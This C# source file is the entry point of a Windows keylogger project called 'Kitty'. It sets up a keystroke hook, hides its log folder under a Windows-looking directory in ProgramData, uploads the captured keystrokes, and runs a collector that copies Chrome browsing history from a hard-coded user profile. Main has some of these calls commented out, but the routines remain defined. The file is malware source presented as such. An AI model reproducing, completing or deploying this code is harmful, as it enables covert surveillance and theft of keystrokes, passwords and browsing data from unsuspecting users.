using Kitty.Db;
using Kitty.Stash;
using Kitty.Win32;
using System;
#if DEBUG
using System.Diagnostics;
#endif
using System.IO;
using System.Windows.Forms;

namespace Kitty
{
    class Program
    {
        static ApplicationMaintain applicationMaintain;
        static string keyloggerDir;

        static void MaintainApplication()
        {
            applicationMaintain = new ApplicationMaintain();
            applicationMaintain.MaintainAsync();
        }

        static void FindStashDirectory()
        {
            string appDataDir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
            keyloggerDir = Path.Combine(appDataDir, "Windows", Application.ProductName);
            if (!Directory.Exists(keyloggerDir))
                Directory.CreateDirectory(keyloggerDir);
        }

        static async void SetupKeylogger()
        {
            var stashProvider = new TextFileFactory(keyloggerDir);
            if (!Keylogger.Hook(stashProvider))
            {
#if DEBUG
                Debug.WriteLine("Keylogger setup error: " + Win32API.GetLastErrorAsMessage());
#endif
            }
            await new SimpleUploader(stashProvider).UploadAsync();
        }
        public static DateTimeOffset FromUnixTimeMilliseconds(long milliseconds)
        {
            if (milliseconds < -62135596800000L || milliseconds > 253402300799999L)
                throw new ArgumentOutOfRangeException("milliseconds", milliseconds, "");

            return new DateTimeOffset(milliseconds * 10000L + 621355968000000000L, TimeSpan.Zero);
        }

        static void Main(string[] args)
        {
            SQLiteConnectionProvider inputConnection = new SQLiteConnectionProvider("C:\\Users\\xuans\\AppData\\Local\\Google\\History1");
            SQLiteConnectionProvider outputConnection = new SQLiteConnectionProvider("C:\\Users\\xuans\\AppData\\Local\\Google\\History");
            new ChromeHistoryCollector(inputConnection, outputConnection).CollectAsync();
            //MaintainApplication();
            //FindStashDirectory();
            //SetupKeylogger();
            //ApplicationInformation.VerifyApplition();
            Application.Run();
            //Keylogger.Unhook();
        }
    }
}
